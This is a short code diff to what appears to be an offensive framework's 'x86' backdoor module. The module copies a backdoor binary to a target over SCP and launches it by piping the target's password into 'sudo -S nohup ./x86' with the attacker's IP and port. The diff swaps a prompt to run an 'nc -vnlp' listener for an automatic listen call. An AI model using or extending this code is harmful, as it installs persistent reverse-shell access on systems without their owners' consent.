@@ -19,14 +19,15 @@ class x86(Backdoor):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./x86 " + self.core.localIP + " " + str(self.get_value("port"))
 
     def do_exploit(self, args):
-        input("Run the following command: nc -vnlp %s in another shell" % str(self.get_value("port")))
+        #input("Run the following command: nc -vnlp %s in another shell" % str(self.get_value("port")))
+        self.listen()
         target = self.core.curtarget
         port = self.get_value("port")
         target.ssh.exec_command('rm x86')
         target.scpFiles(self, 'backdoors/shell/x86/x86', False)
         print(GOOD + "Moving the backdoor program")
         target.ssh.exec_command(self.get_command())
-        print(GOOD + "Python backdoor on %s attempted." % port)
+        print(GOOD + "x86 backdoor on %s attempted." % port)
 
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
